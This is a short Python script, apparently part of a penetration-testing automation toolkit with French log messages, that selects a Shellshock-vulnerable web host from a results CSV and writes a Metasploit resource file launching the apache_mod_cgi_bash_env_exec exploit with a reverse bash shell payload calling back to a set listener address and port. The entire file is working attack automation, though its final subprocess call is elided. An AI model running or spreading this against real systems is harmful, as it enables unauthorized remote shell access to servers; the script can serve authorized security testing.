# every_exploits/shellshock.py
import csv, os, subprocess

def run_shellshock():
    vuln_csv = "/workspace/csv_results/vuln_results.csv"
    rc_path = "/workspace/every_exploits/shellshock.rc"
    target = None
    with open(vuln_csv) as f:
        for r in csv.DictReader(f):
            if "http" in r["service"] and "Shellshock" in r["exploits"]:
                target = r["ip"]; break
    if not target: print("[-] Pas de Shellshock détecté."); return

    with open(rc_path, "w") as rc:
        rc.write("use exploit/multi/http/apache_mod_cgi_bash_env_exec\n")
        rc.write(f"set RHOST {target}\nset TARGETURI /\n")
        rc.write("set PAYLOAD cmd/unix/reverse_bash\n")
        rc.write("set LHOST 192.168.0.14\nset LPORT 4444\nexploit\n")
    subprocess.run([...])  # similaire à ci-dessus

if __name__ == "__main__":
    run_shellshock()
